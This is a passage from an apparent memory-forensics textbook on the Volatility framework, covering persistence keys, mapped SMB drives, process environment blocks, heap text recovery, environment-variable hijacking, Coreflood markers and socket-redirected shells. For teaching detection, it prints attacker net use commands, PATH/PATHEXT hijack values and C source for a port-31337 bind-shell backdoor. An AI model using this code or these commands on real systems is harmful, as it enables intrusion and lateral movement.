REG_SZ        KernelDrv.exe clean : (S) 
      C:\WINDOWS\system32\KernelDrv.exe clean
```

Based on their names, the final two entries seem suspicious—they cause `lanmanwrk.exe` and `KernelDrv.exe` to start automatically at each boot. This run key is one of the most common persistence locations, so you probably would have checked here anyway and found the suspicious entries. However, by using the method described here (via the `handles` plugin) you can attribute the entries back to the exact process that created them.

### Identifying Remote Mapped Drives

Many adversaries rely on commands such as `net view` and `net use` to explore the surrounding network and map remote drives. Obtaining read access to a company’s Server Message Block (SMB) file server or write access to various other workstations or servers in an enterprise can lead to successful lateral movement. However, in these cases, the machine that performs the reconnaissance has open network connections to the remote systems and indicators of the activity in the process handle tables.

The following example shows how an attacker navigates the network to mount two remote drives. The `Users` directory of a system named `WIN-464MMR8O7GF` is mounted on `P`, and the `C$` share of a system named `LH-7J277PJ9J85I` is mounted at `Q`. If left unprotected, the attacker could also mount the `ADMIN$` share in the same manner. Once the drives are mapped, the attacker changes the current working directory of his command shell into a specific user’s documents folder.

```
C:\Users\Jimmy>net view
Server Name            Remark
-------------------------------------------
\\JAN-DF663B3DBF1
\\LH-7J277PJ9J85I
\\WIN-464MMR8O7GF
The command completed successfully.

C:\Users\Jimmy>net use p: \\WIN-464MMR8O7GF\Users
The command completed successfully.

C:\Users\Jimmy>net use q: \\LH-7J277PJ9J85I\C$
The command completed successfully.

C:\Users\Jimmy>net use
New connections will be remembered.

Status       Local     Remote                    Network
---------------------------------------------------------------------------
OK           P:        \\WIN-464MMR8O7GF\Users   Microsoft Windows Network
OK           Q:        \\LH-7J277PJ9J85I\C$      Microsoft Windows Network
The command completed successfully.

C:\Users\Jimmy>cd Q:\Users\Sharm\Documents

Q:\Users\Sharm\Documents
```

The trick to finding evidence of remote mapped drives in memory is to look for file handles prefixed with `\Device\Mup` and `\Device\LanmanRedirector`. MUP, which stands for Multiple Universal Naming Convention (UNC) Provider, is a kernel-mode component that channels requests to access remote files using UNC names to the appropriate network redirector. In this case, `LanmanRedirector` handles the SMB protocol.

Here’s an example of how the output of the `handles` plugin looks on the first hop machine (the one the attacker initially accessed). The system was running a 64-bit version of Vista SP2.

```
$ python vol.py -f hop.mem --profile=VistaSP2x64 handles -t File | grep Mup
Volatility Foundation Volatility Framework 2.4
Offset(V)             Pid       Handle      Access Type     Details
------------------ ------ ------------ ----------- -------- -------
[snip]
0xfffffa8001345c80    752         0xfc     0x100000 File    
\Device\Mup\;P:000000000002210f\WIN-464MMR8O7GF\Users
0xfffffa8003f02050    752        0x200     0x100000 File    \Device\Mup
0xfffffa80042c9f20    752        0x204     0x100000 File    \Device\Mup
0xfffffa80042dc410    752        0x208     0x100000 File    \Device\Mup
0xfffffa800433cf20    752        0x244     0x100000 File    \Device\Mup
0xfffffa800429cb10    752        0x258     0x100000 File    \Device\Mup
0xfffffa800134b190    752        0x264     0x100000 File    
\Device\Mup\;Q:000000000002210f\LH-7J277PJ9J85I\C$
0xfffffa800132b450   1544          0x8     0x100020 File    
\Device\Mup\;Q:000000000002210f\LH-7J277PJ9J85I\C$\Users\Jimmy\Documents
```

You have several plain handles to `\Device\Mup` (they are normal). The few in bold are the ones you should find interesting because they actually display the local drive letter, the remote NetBIOS name, and the share or file system path name. There are also two different process IDs shown: 752 and 1544. In this case, 752 is the instance of `svchost.exe` that runs the `LanmanWorkstation` service; it creates and maintains client network connections to remote servers using the SMB protocol. PID 1544 is the `cmd.exe` shell, and it has a handle to `C$\Users\Jimmy\Documents` as a result of the attacker changing into that directory.

Another way to detect remote mapped shares, which can be used in combination with the `handles` method, is to inspect symbolic links via the `symlinkscan` plugin. These kernel objects can be used to associate a drive letter, such as `Q` or `P`, with the redirected path. For example, the output looks like this:

```
$ python vol.py -f hop.mem --profile=VistaSP2x64 symlinkscan 
Volatility Foundation Volatility Framework 2.4
Offset(P)            #Ptr   #Hnd Creation time                  From       To  
------------------ ------ ------ ------------------------------ ---------- --
0x0000000024b0c6c0      1      0 2014-02-25 21:41:12 UTC+0000   Q:              
\Device\LanmanRedirector\;Q:0...00002210f\LH-7J277PJ9J85I\C$
0x0000000026f4a800      1      0 2014-02-25 21:40:45 UTC+0000   P:              
\Device\LanmanRedirector\;P:0...02210f\WIN-464MMR8O7GF\Users
```

One of the advantages of combining your methodologies is that with `symlinkscan`, you also get the exact time when the remote share was mounted. By incorporating this into your timeline, or (better yet) extracting the attacker’s command history from `cmd.exe` (see Chapter 17), you can quickly answer a lot of questions about the activities performed on the victim system or network.

## Summary

The evidence you look for, and the order in which you look for it, varies from case to case. However, in our experience, viewing the processes is a reasonable starting point, because it gives you an idea of what type of applications are running. As you’re analyzing the process list, keep in mind that malware frequently hides by blending in with critical system processes or by unlinking a process from the kernel’s process list. If you cannot fully identify a process by its name, leverage handles to determine what operating system resources the process is accessing. Also consider whether the user account under which the process is running should be allowed to perform the actions. Once you gain experience with these types of investigations, you can build (or trade) indicator lists with other analysts in the community and essentially automate the procedure to save time in the future.
# Chapter 7 Process Memory Internals

Even after years of experience digging through RAM, the amount of evidence you can find in process memory never ceases to amaze us. Although artifacts in kernel memory, such as an `_EPROCESS`, can provide useful details, the actual memory that the process uses is highly concentrated with data that can reveal valuable information about the process’ current state. This data includes, but is not limited to, all content processed by the application (received via the network or interactive user input); mapped files; shared libraries; passwords; credit card transactions (for point-of-sale [POS] systems); and private structures for e-mail, documents, and chat logs.

This chapter analyzes the various application programming interfaces (APIs) used for allocating the different data types and examines how to enumerate process memory regions via memory forensics. In doing so, you’ll see how to leverage characteristics (such as permissions, flags, and sizes) of memory ranges to deduce what kind of data they contain. You’ll also learn the tools and techniques for extracting all process memory (at least what’s addressable and memory-resident) or individual ranges to a file, which enables you to further analyze it with external tools such as virus scanners, disassemblers, and so on. Finally, we present several ways to search for patterns within process memory, involving both Volatility’s APIs and Yara signatures.

## What’s in Process Memory?

[Figure 7-1](#figure7-1) shows a ...
# Chapter 8  
 Hunting Malware in Process Memory

The previous chapter introduced you to process memory internals and set the foundations for you to deep dive into analysis. Now you’ll see some specific examples of how you can detect malware that hides in process memory by unlinking dynamic linked libraries (DLLs) or using one of four different methods of injecting code. You’ll also learn the fundamentals of dumping processes, libraries, and kernel modules (any portable executable [PE] files) from memory, including samples that are initially packed or compressed.

## Process Environment Block

Every `_EPROCESS` structure contains a member called the Process Environment Block (PEB). The PEB contains the full path to the process’ executable, the full command line that starts the process, the current working directory, pointers to the process’ heaps, standard handles, and three doubly linked lists that contain the full path to DLLs loaded by the process.

---

## **Analysis Objectives**

Your objectives are these:

- **Recover command lines and process paths:** Learn about sources in process memory that can provide details about how a process was invoked and where its file resides on disk.
- **Analyze heaps:** Learn what types of data applications store on their heap(s) and see a practical example that locates the text typed into Notepad.
- **Inspect environment variables:** Learn how to detect search order hijacking and malware families that mark their presence by creating new variables.
- **Detect backdoors with standard handles:** Determine whether a process’ input and output are being redirected over a remote network socket to an attacker.
- **Enumerate DLLs:** Learn how the operating system tracks DLLs loaded by a process, as well as the APIs that you use on live systems to list them. At the same time, you’ll see how to detect hidden and unlinked libraries.
- **Extract PE files from memory**: Learn how to dump PE files from memory and prepare them for static analysis with a disassembler. You’ll be exposed to the ways PE files change when loaded into memory and how the changes can affect your investigations.
- **Detect code injection**: See detailed descriptions of four types of code injection, including how to detect them with memory forensics.

## **Data Structures**

The main PEB structure is appropriately named `_PEB`. The following code shows how it appears for a 64–bit Windows 7 system, along with the structures for process parameters and DLLs. Remember that the `_PEB` structure exists in process memory, so a process can easily modify its own values to falsely report information or thwart analysis. Later in the chapter, you’ll see how to leverage data in the kernel (such as virtual address descriptors [VADs] and page tables) to cross-reference with some of the information available in the PEB.

```
>>> dt("_PEB")
'_PEB' (896 bytes)
0x0   : InheritedAddressSpace    ['unsigned char']
0x1   : ReadImageFileExecOptions ['unsigned char']
0x2   : BeingDebugged            ['unsigned char']
[snip]
0x10  : ImageBaseAddress         ['pointer64', ['void']]
0x18  : Ldr                      ['pointer64', ['_PEB_LDR_DATA']]
0x20  : ProcessParameters        ['pointer64', ['_RTL_USER_PROCESS_PARAMETERS']]
0x28  : SubSystemData            ['pointer64', ['void']]
0x30  : ProcessHeap              ['pointer64', ['void']]
[snip]
0xe8  : NumberOfHeaps            ['unsigned long']
0xec  : MaximumNumberOfHeaps     ['unsigned long']
0xf0  : ProcessHeaps             ['pointer', ['array', 
 lambda x: x.NumberOfHeaps, ['pointer', ['_HEAP']]]]

>>> dt("_RTL_USER_PROCESS_PARAMETERS")
'_RTL_USER_PROCESS_PARAMETERS' (1024 bytes)
[snip]
0x20  : StandardInput                  ['pointer64', ['void']]
0x28  : StandardOutput                 ['pointer64', ['void']]
0x30  : StandardError                  ['pointer64', ['void']]
0x38  : CurrentDirectory               ['_CURDIR']
0x50  : DllPath                        ['_UNICODE_STRING']
0x60  : ImagePathName                  ['_UNICODE_STRING']
0x70  : CommandLine                    ['_UNICODE_STRING']
0x80  : Environment                    ['pointer64', ['void']]
[snip]

>>> dt("_PEB_LDR_DATA")
'_PEB_LDR_DATA' (88 bytes)
[snip]
0x10  : InLoadOrderModuleList          ['_LIST_ENTRY']
0x20  : InMemoryOrderModuleList        ['_LIST_ENTRY']
0x30  : InInitializationOrderModuleList ['_LIST_ENTRY']
[snip]

>>> dt("_LDR_DATA_TABLE_ENTRY")
'_LDR_DATA_TABLE_ENTRY' (224 bytes)
0x0   : InLoadOrderLinks               ['_LIST_ENTRY']
0x10  : InMemoryOrderLinks             ['_LIST_ENTRY']
0x20  : InInitializationOrderLinks     ['_LIST_ENTRY']
0x30  : DllBase                        ['pointer64', ['void']]
0x38  : EntryPoint                     ['pointer64', ['void']]
0x40  : SizeOfImage                    ['unsigned long']
0x48  : FullDllName                    ['_UNICODE_STRING']
0x58  : BaseDllName                    ['_UNICODE_STRING']
0x68  : Flags                          ['unsigned long']
0x6c  : LoadCount                      ['unsigned short']
[snip]
```

## **Key Points**

The key points for `_PEB` are these:

- `BeingDebugged`: Tells you whether the process is currently being debugged. In the past, we’ve seen malware that attaches to itself (by calling `DebugActiveProcess`). Because only one debugger at a time can attach to a target process, it served as anti-debugging protection. Thus, there is a red flag if this value is set to true, but there are no legitimate active debuggers running.
- `ImageBaseAddress`: The address in process memory where the main executable (`.exe`) is loaded. Before Volatility’s `procdump` plugin (described later in the chapter) carves an executable from memory, it reads this value so it knows where to look.
- `Ldr`: Points to a `_PEB_LDR_DATA` structure, which contains details about the DLLs loaded in a process.
- `ProcessParameters`: Points to a `_RTL_PROCESS_PARAMETERS` structure (described soon).
- `ProcessHeap`: Primary heap for the process, which is created automatically when the process is initialized.
- `NumberOfHeaps`: Number of heaps in a process. By default, a process has only one heap, but it can create others by calling `HeapCreate`.
- `ProcessHeaps`: An array of pointers to process heaps. The first entry in this list always points to the same location as `ProcessHeap` because it is the primary.

Your key points for `_RTL_PROCESS_PARAMETERS` are these:

- `StandardInput`: The process’ standard input handle.
- `StandardOutput`: The process’ standard output handle.
- `StandardError`: The process’ standard error handle.
- `CurrentDirectory`: The current working directory for the application.
- `ImagePathName`: The Unicode full path on disk to the process executable (`.exe`). You often need to consult this value because the `_EPROCESS.ImageFileName` (printed by the `pslist` plugin) contains only the first 16 characters and it does not include Unicode.
- `CommandLine`: The full command line, including all arguments, used to invoke the process.
- `Environment`: A pointer to the process’ environment variables.

Your key points for `_PEB_LDR_DATA` follow. All the linked lists contain elements of type `_LDR_DATA_TABLE_ENTRY`, which is described next. Also, the term “module” here refers to any executable image, which includes the process executable and DLLs.

- `InLoadOrderModuleList`: A linked list that organizes modules in the order in which they are loaded into a process. Because the process executable is always first to load in the process address space, its entry is first in this list.
- `InMemoryOrderModuleList`: A linked list that organizes modules in the order in which they appear in the process’ virtual memory layout. For example, the last DLL to load may end up at a lower base address than the first (due to address space layout randomization [ASLR] and other factors).
- `InInitializationOrderModuleList`: A linked list that organizes modules in the order in which their `DllMain` function was executed. This is different from the load order list because a module’s `DllMain` isn’t always called immediately when it loads. Sometimes it’s never called, for example when you load a DLL as a data file or image resource (see the `dwFlags` parameter to `LoadLibraryEx`).

The key points for `_LDR_DATA_TABLE_ENTRY` are the following:

- DllBase: This is the base address of the module in process memory. The DLL dumping plugins that you’ll learn about later in the chapter will read this address to know where to start carving.
- `EntryPoint`: The first instruction executed by the module. In most cases, it is taken from the PE file’s `AddressOfEntryPoint` value.
- `SizeOfImage`: The size of the module, in bytes.
- `FullDllName`: The full path to the module’s file on disk (for example, `C:\Windows\System32\kernel32.dll`).
- `BaseDllName`: The base portion of the module’s filename (for example, `kernel32.dll`).
- `LoadCount`: The number of times `LoadLibrary` was called for the module. It is used as a reference count to know when it is safe to unload a DLL from process memory. You’ll see this value later in the chapter to determine how a DLL was loaded (via the import address table [IAT] or an explicit call to `LoadLibrary`).

---

### Process Heaps

From a forensics perspective, when you dump process memory via `memdump` or `vaddump`, you inevitably get the heap contents (at least the pages that are not swapped). The same applies to scanning memory with Yara and the `search_process_memory` API discussed in Chapter 7. The problem is that you won’t necessarily know which offsets in your dump file or signature results correspond to heap regions. Furthermore, in some cases you might want to analyze *only* heap memory. For example, say you’re looking for the data an application received over the network or the text a user typed into a word processor. These types of data have a good chance of being on one of the process’ heaps, so there’s no need to waste time scanning memory regions that contain DLLs, stacks, or mapped files.

---

**NOTE**

For a thorough overview of modern heaps structures and internals, see *Windows 8 Heap Internals* by Chris Valasek and Tarjei Mandt: [http://illmatics.com/Windows%208%20Heap%20Internals.pdf](http://illmatics.com/Windows%208%20Heap%20Internals.pdf)

---

### Finding Text on Notepad’s Heap

This example demonstrates how you can drastically narrow the search space when looking for forensic evidence on the heap. The research was sparked when a member of the Volatility user’s mailing list asked this question: How do I find the text a user entered into Notepad? One way, of course, is to reverse engineer `notepad.exe` and determine where it stores the pointer to data that the application receives from the keyboard. However, we took a slightly easier, more black-box approach. First, to set up the environment, we started two instances of Notepad: one opened a rather large log file and the other was used by the “suspect” to develop a plan for committing a crime (the one you’re investigating). An example of the suspect’s desktop is shown in [Figure 8-1](#figure8-1).

![c08f001.tif](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c08/c08f001.png)

*[**Figure 8-1:**](#figureanchor8-1) The text you see in the open Notepad windows is stored on the Notepad process’ heap*

Suppose that you obtained a memory dump from the suspect’s system. At this time, you can run plugins such as `vadinfo` and `vadtree` on the Notepad processes, but (on this particular machine) you’ll see 50+ VAD nodes that encompass more than 25MB of data in each process. How do you pinpoint completely arbitrary text in a collection of 25 million bytes? You can begin by filtering out only the VADs that contain process heaps.

As the following output from the `heaps` plugins shows, the process with PID 3988 has 6 heaps. Collectively, this narrows your search to 6 VADs and approximately 1.3MB of data. At this point, the black-box approach kicked in. We started looking for anything that might help isolate the heap chunks containing the desired text from all others. As shown, two chunks stood out because the “extra” flag is displayed. In other words, the `HEAP_ENTRY_EXTRA_PRESENT` flag was set in the `_HEAP_ENTRY.Flags` member for these two chunks. Both chunks existed in the primary heap (the first one in the `ProcessHeaps` array) that starts at `0xa0000`:

```
$ python vol.py -f Win2K3SP1x86.vmem --profile=Win2003SP1x86 
    heaps -p 3988 

Volatility Foundation Volatility Framework 2.4
**************************************************
Process: notepad.exe, Pid: 3988
PEB: 0x7ffdf000, Heap: 0xa0000, NumberOfHeaps: 0x6
**********
_HEAP at 0xa0000
  0xa0640 Size: 0x8 Previous: 0xc8 Flags: busy 
  0xa0680 Size: 0x301 Previous: 0x8 Flags: busy 
  0xa1e88 Size: 0x4 Previous: 0x301 Flags: busy 
  0xa1ea8 Size: 0xb Previous: 0x4 Flags: busy 
  0xa1f00 Size: 0xb Previous: 0xb Flags: busy 
  [snip]
  0xa8028 Size: 0x3 Previous: 0x12 Flags: busy, extra
  [snip]
  0xac740 Size: 0xe Previous: 0xb Flags: busy 
  0xac7b0 Size: 0x37 Previous: 0xe Flags: busy, extra
  0xac968 Size: 0xd3 Previous: 0x37 Flags: last 
**********
_HEAP at 0x1a0000
  0x1a0640 Size: 0x8 Previous: 0xc8 Flags: busy 
  0x1a0680 Size: 0x530 Previous: 0x8 Flags: last 
**********
_HEAP at 0x3c0000
  0x3c0640 Size: 0x8 Previous: 0xc8 Flags: busy 
  0x3c0680 Size: 0x301 Previous: 0x8 Flags: busy 
  0x3c1e88 Size: 0x3 Previous: 0x301 Flags: busy 
  0x3c1ea0 Size: 0x2c Previous: 0x3 Flags: last 
[snip]
```

Regardless of the actual meaning of the “extra” flag (we’ve never found a good description) it was a discrepancy that turned our attention to the chunks at `0xa8028` and `0xac7b0`. The following `volshell` command shows that one of these chunks does indeed contain a Unicode version of our suspect’s text. Note that the text actually starts at `0xac7b8` because a `_HEAP_ENTRY` exists at the base, which is 8 bytes on a 32-bit platform.

```
$ python vol.py -f Win2K3SP1x86.vmem --profile=Win2003SP1x86 
     volshell -p 3988

Volatility Foundation Volatility Framework 2.4
Current context: process notepad.exe, pid=3988, ppid=416 DTB=0x140ab4e0
To get help, type 'hh()'
>>> db(0xac7b0)
0x000ac7b0  3700 0e00 e523 1000 4c00 6900 7300 7400   7....#..L.i.s.t.
0x000ac7c0  2000 6f00 6600 2000 7400 6100 7200 6700   ..o.f...t.a.r.g.
0x000ac7d0  6500 7400 7300 3a00 0d00 0a00 0d00 0a00   e.t.s.:.........
0x000ac7e0  4a00 6900 6d00 2000 4a00 6100 6d00 6500   J.i.m...J.a.m.e.
0x000ac7f0  7300 0d00 0a00 4200 6f00 6200 6200 7900   s.....B.o.b.b.y.
0x000ac800  2000 4b00 6e00 6900 6700 6800 7400 2000   ..K.n.i.g.h.t...
0x000ac810  0d00 0a00 5000 6500 7400 6500 7200 2000   ....P.e.t.e.r...
0x000ac820  5300 6900 6c00 7600 6500 7200 0d00 0a00   S.i.l.v.e.r.....
```

At this point, we built a `notepad` plugin that automatically dumps the text from `notepad.exe` processes. Here’s how the plugin’s output looks:

```
$ python vol.py –f Win2K3SP1x86.vmem --profile=Win2003SP1x86 notepad
Volatility Foundation Volatility Framework 2.4

Process: 3988
Text:
List of targets:
Jim James
Bobby Knight 
Peter Silver
Amy Christoph
Plan: 
Get their cell phone numbers
Text with a place to meet
Blackmail with pictures 
Collect money and profit
```

Despite being entirely based on an educated guess rather than empirical testing or reverse engineering, the plugin works consistently and accurately on 32-bit versions of XP and 2003 Server. Even if we didn’t catch a break with the “extra” flag indicators, it is still possible to narrow the search space to 1.3 MB out of the entire process memory space by just looking at the regions that contain heaps.

### Environment Variables

A process’ environment variables are pointed to by `_PEB.ProcessParameters.Environment`. The variables are organized as multiple NULL-terminated strings, similar to a `REG_MULTI_SZ` value in the registry. If an attacker manipulates these variables, they can cause the target application to unexpectedly execute a malicious process. Additionally, some malware marks its presence by creating environment variables rather than mutexes. (see the “Coreflood Presence Marking” section) Thus, you should know how to check for suspicious entries. [Table 8-1](#table8-1) categorizes the different types of variables according to their scope and persistence.

*[**Table 8-1**](#tableanchor8-1): Sources and Scopes of Environment Variables*

|  |  |  |  |
| --- | --- | --- | --- |
| **Type** | **Source** | **Scope** | **Persists** |
| System | `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment` | Everyone (all processes) | Yes |
| User | `HCKU\Environment` | A user | Yes |
| Volatile | `HKCU\Volatile Environment` | A user | No |
| Dynamic | `SetEnvironmentVariable` | A process | No |

The *System* and *User* variables are both persistent in the registry. Thus, you can enumerate them by parsing registry hive files that were acquired from disk. The *Volatile* variables are also stored in the registry, but in a volatile key, so you must access them by capturing RAM and using Volatility’s cached registry support (see Chapter 10). The *Dynamic* variables are set per process when a thread within the process calls `SetEnvironmentVariable`. Similar to the Volatile variables, these entries are found only in memory—they’re never written to the registry hives on disk or any other log file.

When a process is created, it usually inherits the environment block from its parent. The parent process can override this default behavior by specifying the `lpEnvironment` parameter when it calls `CreateProcess`. Here’s a list of the types of data you can typically find in environment variables:

- Paths to executable programs (`PATH`)
- Extensions assigned to executable programs (`PATHEXT`)
- Paths to temporary directories
- Paths to a user’s Documents, Internet History, and Application Data folders
- User names, computer names, and domain names
- The location of `cmd.exe` (`ComSpec`)

#### Attacks on Environment Variables

The two most common types of attacks on environment variables include changing the `PATH` and `PATHEXT` variables. Modifying these values has an effect similar effect to search-order hijacking. For example, consider the following scenario:

```
PATH=C:\windows;C:\windows\system32
PATH=C:\Users\HR101\.tmp;C:\windows;C:\windows\system32
```

In this case, if the `PATH` variable is updated in `explorer.exe` and the logged-on user goes to Start ⇒ Run and types “**calc**”, the system will search for an application named “calc” in the `C:\users\HR101\.tmp` directory before it looks in the `windows` and `system32` directories. Thus, the user will unexpectedly execute malicious code. Likewise, the `PATHEXT` variable contains a list of extensions that are searched if a user fails to specify one. For example, if you type “**calc**” as previously mentioned, the system will look for `calc.com` first, then `calc.exe`, then `calc.bat` , and so on. Due to the following modifications, an attacker could plant a file named `calc.zzz` in one of the searched directories, and it would be executed first:

```
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE
PATHEXT=.ZZZ;.COM;.EXE;.BAT;.CMD;.VBS;.VBE
```

Of course, in these situations, the malicious code being invoked would subsequently launch the legitimate `calc.exe`—so the user doesn’t start to suspect foul play.

#### Coreflood Presence Marking

Many malware samples mark their presence on a system by creating globally accessible mutexes. This helps prevent accidental re-infection. Mutexes also provide a strong forensic indicator. Coreflood used environment variables for a very similar purpose—to mark its presence within a process. Because Coreflood’s main component is a DLL, the authors needed a way to make sure that the same process didn’t get injected with the malware more than once. Thus, they programmed the DLL’s entry function to create a pseudo-randomly generated string based on the parent process’ PID and the disk’s volume serial number. The string was then added to the process’ environment variables by calling `SetEnvironmentVariable`, if it didn’t already exist. Otherwise, the DLL unloaded immediately. A graph of the DLL’s entry function (produced by IDA Pro) is shown in [Figure 8-2](#figure8-2).

![c08f002.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c08/c08f002.png)

*[**Figure 8-2:**](#figureanchor8-2) A graph showing the functions called by Coreflood’s entry point*

An interesting riddle that we like to ask students in our training class is this: Based on what you just learned, how many of the following processes are infected with Coreflood’s DLL? Note that we are using Volatility’s `envars` plugin to enumerate the variables in a memory dump.

```
$ python vol.py -f coreflood.img --profile=WinXPSP3x86 envars

**************************************************
Pid 1144 explorer.exe (PPid 644) Block at 0x10000
USERNAME=Administrator
USERPROFILE=C:\Documents and Settings\Administrator
VFTPXXPYVTAMF=EWONSYG
windir=C:\WINDOWS
[SNIP]

**************************************************
Pid 512 IEXPLORE.EXE (PPid 1144) Block at 0x10000
ProgramFiles=C:\Program Files
QBYXKDAGXM=EWONSYG
SESSIONNAME=Console
USERDOMAIN=JAN-DF663B3DBF1
USERNAME=Administrator
USERPROFILE=C:\Documents and Settings\Administrator
VFTPXXPYVTAMF=EWONSYG
[SNIP]

**************************************************
Pid 560 notepad.exe (PPid 1144) Block at 0x10000
USERNAME=Administrator
USERPROFILE=C:\Documents and Settings\Administrator
VFTPXXPYVTAMF=EWONSYG
[SNIP]

**************************************************
Pid 220 firefox.exe (PPid 1144) Block at 0x10000
USERNAME=Administrator
USERPROFILE=C:\Documents and Settings\Administrator
VFTPXXPYVTAMF=EWONSYG
[SNIP]
```

If you answered “two,” you are correct. At first glance, it appears as if all four processes are infected, because they all contain suspicious variable names. However, we previously mentioned that child processes typically inherit their parent’s variables. We also said the variable name depends on the PID of the process. If all four processes were infected, you’d see four unique variable names; but you see only two (`VFTPXXPYVTAMF` and `QBYXKDAGXM`). The last three processes (`IEXPLORE.EXE`, `notepad.exe`, and `firefox.exe`) were spawned by PID 1144, which explains why they have a copy of the `VFTPXXPYVTAMF` variable. You’ll notice that `IEXPLORE.EXE` actually has two variables: the one it inherited from its parent and the one Coreflood calculated for its own PID.

---

**NOTE**

The `--silent` option to the `envars` plugin causes it to suppress known variables (based on a hard-coded whitelist). This is handy in situations where a variable’s name or value isn’t blatantly obvious; for example, like `VFTPXXPYVTAMF`.

---

### Standard Handles

By analyzing a process’ standard handles, you can determine where it gets input and where it sends output and error messages. This is especially useful when investigating potential breaches by remote attackers. For example, a fairly common way to create a backdoor command shell on a system involves spawning an instance of `cmd.exe` and redirecting its standard handles over named pipes or network sockets. Thus, the attackers can use `telnet` or `netcat` to connect to the target machine (provided that no firewall is blocking access), and type commands as if they were sitting at the console. The following code shows the relevant C source code for a backdoor that uses this technique:

```
  1 mySockAddr.sin_family = PF_INET;
  2 mySockAddr.sin_port = htons(31337);
  3 mySockAddr.sin_addr.s_addr = htonl(INADDR_ANY);
  4 
  5 if (bind(myMainSock, (SOCKADDR *)&mySockAddr, 
  6     sizeof(mySockAddr)) == SOCKET_ERROR)
  7 {   
  8     WSACleanup();
  9     return(-1);
 10 }
 11 
 12 while(1) {
 13     myCliSock = SOCKET_ERROR;
 14     while(myCliSock == SOCKET_ERROR) {
 15         Sleep(1);
 16         listen(myMainSock, SOMAXCONN);
 17         ulSzSockAddr = sizeof(myCliSockAddr);
 18         myCliSock = accept(myMainSock, 
 19             (SOCKADDR *)&myCliSockAddr, 
 20             (int *)&ulSzSockAddr);
 21     }
 22     memset(&mySi, 0, sizeof(mySi));
 23     memset(&myPi, 0, sizeof(myPi));
 24     mySi.wShowWindow = SW_HIDE;
 25     mySi.dwFlags = STARTF_USESTDHANDLES | 
 26                    STARTF_USESHOWWINDOW;
 27     mySi.hStdError = (VOID *)myCliSock;
 28     mySi.hStdInput = (VOID *)myCliSock;
 29     mySi.hStdOutput = (VOID *)myCliSock;
 30     CreateProcess(0, wcsdup(L"cmd.exe"), 0, 0, 
 31                   1, // bInheritHandles = TRUE
 32                   0, 0, 0, &mySi, &myPi);
 33 }
```

Lines 1–3 configure an IPv4 socket that will listen on all interfaces (`INADDR_ANY`) on port 31337. Lines 5–10 bind the local address to the socket. The function then enters a while loop (lines 12–33) that executes for as long as the process stays running. On lines 16–20, the program begins to listen on the port and calls `accept` to enter a state in which it can receive client connections. After an incoming connection is received, it sets up the specifications for the child `cmd.exe` process on line 25. In particular, it enables `STARTF_USESTDHANDLES` in the `_STANDARD_INFORMATION` block (`mySi`) and then sets the `hStdError`, `hStdInput`, and `hStdOutput` values to the client socket (`myCliSock`). Finally, on lines 30–32, the `cmd.exe` instance is started. Note that `bInheritHandles` is set to 1, which means that the child process inherits a copy of the parent’s handles (specifically for access to the `myCliSock` socket handle).

At this point, any commands that the attackers type over the network are tunneled straight into `cmd.exe` via its standard input. Results are passed back to the client over standard output. If you’re investigating the victim machine and see `cmd.exe` running, you might not think anything of it. However, you’d be overlooking the one piece of evidence that matters most. Take a look at how the standard handles appear for the process that is involved in the backdoor activity:

```
$ python vol.py -f memory.dmp --profile=Win7SP1x64 volshell
Volatility Foundation Volatility Framework 2.4
Current context: process System, pid=4, ppid=0 DTB=0x187000
To get help, type 'hh()'
>>> for proc in win32.tasks.pslist(self.addrspace):
...   if str(proc.ImageFileName) != "cmd.exe":
...     continue
...   if proc.Peb:
...     print proc.UniqueProcessId,\
...     hex(proc.Peb.ProcessParameters.StandardInput),\
...     hex(proc.Peb.ProcessParameters.StandardOutput),\
...     hex(proc.Peb.ProcessParameters.StandardError)
... 
572 0x3L 0x7L 0xbL
3436 0x3L 0x7L 0xbL
564 0x3L 0x7L 0xbL
2160 0x68L 0x68L 0x68L
```

Four instances of `cmd.exe` are running on the machine. The first three have normal values for standard input (`0x3`), standard output (`0x7`), and standard error (`0xb`). The last one, PID 2160, displays `0x68` for all handles. You can determine whether `0x68` corresponds to a named pipe or network socket by using the `handles` plugin, as shown in the following output. In Chapter 11, you’ll learn that open handles to `\Device\Afd\Endpoint` indicate network activity (`Afd` is the Auxiliary Function Driver for Winsock).

```
$ python vol.py -f memory.dmp --profile=Win7SP1x64 handles -p 2160 -t File 
Volatility Foundation Volatility Framework 2.4
Offset(V)             Pid     Handle  Type    Details
------------------ ------ ---------  -------- -------
0xfffffa80015c4070   2160       0xc  File      
\Device\HarddiskVolume1\Users\Elliot\Desktop
0xfffffa8002842130   2160      0x54  File      \Device\Afd\Endpoint
0xfffffa80014f3af0   2160      0x68  File      \Device\Afd\Endpoint
```

Although `cmd.exe` didn’t create any sockets, it has access to them as a result of the inheritance. You can determine the exact port the backdoor uses, as well as the remote endpoint if any connections are currently established, by first looking up the parent process for `cmd.exe` and then listing its network information (see Chapter 11). You can complete these two actions with the `pstree` and `netscan` plugins, as shown in the following output:

```
$ python vol.py -f memory.dmp --profile=Win7SP1x64 pstree
Volatility Foundation Volatility Framework 2.4
Name                                   Pid   PPid   Thds   Hnds
------------------------------------ ------ ------ ------ ------ 
[snip]
.. 0xfffffa80011105e0:memen.exe        1400    572      1     30 
... 0xfffffa8002b42060:cmd.exe         2160   1400      1     25 
. 0xfffffa8002827060:cmd.exe           3436   1408      1     25 
 0xfffffa8002be6b30:moby.exe           3036   3024     15    385 

$ python vol.py -f memory.dmp --profile=Win7SP1x64 netscan 
Volatility Foundation Volatility Framework 2.4 
Proto    Local Address          Foreign Address      State        Pid  Owner    
TCPv4    0.0.0.0:31337          0.0.0.0:0            LISTENING    1400 memen.exe
TCPv4    192.168.228.171:31337  <REDACTED>:59574     ESTABLISHED  1400 memen.exe
```

The parent of `cmd.exe` PID 2160 is `memen.exe` PID 1400. The parent has one listening IPv4 socket on port 31337 and one established connection (the remote endpoint is redacted). This is an interesting example because the primary network activity maps back to the parent process, but the child is the one actually being used to execute commands and pass the results back to the attacker.

### Dynamic Link Libraries (DLLs)

DLLs contain code and resources that can be shared between multiple processes. They’re popular among malware and threat actors because DLLs are designed to run inside a host process, thus giving them access to all of the process’ resources: its threads, handles, and full range of process memory. Furthermore, DLLs allow toolkits to be modular and extensible. At the very least, when analyzing DLLs, you should check for the following:

- **List discrepancies:** As you’ll learn soon, adversaries try to hide their DLLs by unlinking metadata structures from one or more lists or by overwriting the name or path fields in the metadata structures. You can detect such attempts by cross-referencing.
